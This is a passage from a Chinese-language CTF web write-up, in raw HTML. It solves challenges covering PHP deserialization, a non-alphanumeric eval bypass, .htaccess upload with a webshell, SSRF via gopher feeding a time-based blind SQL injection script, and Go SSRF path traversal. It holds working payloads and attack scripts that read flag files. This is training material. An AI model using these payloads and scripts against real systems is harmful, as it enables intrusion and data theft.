class="string">''</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"this is destruct"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$log = $_GET[<span class="string">'log'</span>];</span><br><span class="line">$log = preg_replace(<span class="string">"/[&lt;&gt;*#'|?\n ]/"</span>,<span class="string">""</span>,$log);</span><br><span class="line">$log = str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$log);</span><br><span class="line">$log_unser = unserialize($log);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="number">14</span>级大风停电了.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>简单的一个反序列化，可直接执行system(‘cat /flag’)。</p>
<p>通过str_replace将flag字符替换为空，利用双写绕过。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $weblogfile=<span class="string">'/flag'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$log = <span class="keyword">new</span> weblog();</span><br><span class="line">$res = serialize($log);</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line"><span class="comment">//然后双写flag绕过即可</span></span><br><span class="line"><span class="comment">//O:6:"weblog":1:&#123;s:10:"weblogfile";s:5:"/flflagag";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/11/71lmLK9dj5Wq3kJ.png" alt="image-20210511094747156"></p>
<h4 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h4><p>题目源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$@]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'fighting!'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">?code=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=`/???/??? /????`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/11/SaKZsVYM1QrOFT5.png" alt="image-20210511095129976"></p>
<h4 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h4><p>查看题目给出源码</p>
<p><code>Apache2.conf</code></p>
<p><img src="https://i.loli.net/2021/05/11/RixhnB2yZ9d37S8.png" alt="image-20210511095354115"></p>
<p>发现在配置层面禁止了upload沙盒解析php</p>
<p>搜索资料发现，配置文件的<code>&lt;directory&gt;</code> 晚于<code>htaccess</code>执行，所以确定此题目为<code>.htaccess</code>的利用</p>
<p><img src="https://i.loli.net/2021/05/11/X7WfoCZSFg8rnDV.png" alt="image-20210511101312920"></p>
<p>之后尝试上传phpinfo文件，可以看到上传成功并且存在disable_functions</p>
<p><img src="https://i.loli.net/2021/05/11/S2DFw5xMWXPEJYG.png" alt="image-20210511101243321"></p>
<p>利用file_gets_contents进行bypass disable_functions.</p>
<p>通过上传参数为shell的小马进行rce。</p>
<p><code>shell=echo file_get_contents(&quot;/flag&quot;);</code></p>
<p><img src="https://i.loli.net/2021/05/11/IEUfoAmZJ7ueMcb.png" alt="image-20210511103408657"></p>
<h4 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h4><p>题目源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>] ?? <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span>($url)</span><br><span class="line">    &#123;</span><br><span class="line">    $a = preg_match(<span class="string">"/file|dict/i"</span>, $url);</span><br><span class="line">        <span class="keyword">if</span> ($a==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">"url"</span>]);</span><br><span class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_exec($ch);</span><br><span class="line">            curl_close($ch);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>很显然，利用方法SSRF</p>
<p>利用gopher协议进行POST注入，无过滤</p>
<p><code>gopher.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$payload = <span class="string">"poc="</span> . $argv[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//$payload = "poc=if((select ascii(substr(database(),1,1)))=115,sleep(0.4),1)";</span></span><br><span class="line">$value = <span class="string">"POST /admin.php HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="string">cache-control: no-cache</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: "</span> . strlen($payload) . <span class="string">"</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span> . $payload . <span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode((<span class="string">"gopher://127.0.0.1:80/_"</span> . rawurlencode($value)));</span><br></pre></td></tr></table></figure></div>

<p><code>poc.py</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://121.36.147.29:20001/?url='</span></span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line">x=<span class="string">""</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> Len <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">34</span></span><br><span class="line">    <span class="keyword">while</span> max &gt;= min:</span><br><span class="line">        mid = (max + min) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">'if((select ascii(substr((select flag from flag),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(0.2),1)'</span>.format(Len,mid)</span><br><span class="line">        print(payload)</span><br><span class="line">        tmp_r = os.popen(<span class="string">'php D:/Temp/Web/gopher.php "'</span>+payload+<span class="string">'"'</span>).read()</span><br><span class="line"></span><br><span class="line">        before_time = time.time()</span><br><span class="line"></span><br><span class="line">        tmp_url = url+tmp_r</span><br><span class="line">        print(tmp_url)</span><br><span class="line">        r = requests.get(tmp_url)</span><br><span class="line">        after_time = time.time()</span><br><span class="line">        offset = after_time-before_time</span><br><span class="line">        <span class="keyword">if</span> (offset&gt;<span class="number">2</span>):</span><br><span class="line">            min = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max = mid</span><br><span class="line">        <span class="keyword">if</span> max == mid == min:</span><br><span class="line">            x += chr(mid)</span><br><span class="line">            print(<span class="string">"success:&#123;&#125; length:&#123;&#125;"</span>.format(x, len(x)))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/11/49MieUcCl6GRrWK.png" alt="image-20210511110010580"></p>
<h4 id="GoOSS"><a href="#GoOSS" class="headerlink" title="GoOSS"></a>GoOSS</h4><p>SSRF</p>
<p>Go代码可通过302跳转完成ssrf</p>
<p><code>gin-gonic/gin</code>特性发现双<code>//</code>可触发SSRF </p>
<p><code>payload</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"url"</span>:<span class="string">"http://127.0.0.1//localhost?file=../../../../../flag&amp;hehe=../.."</span>&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <tags>
        <tag>web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
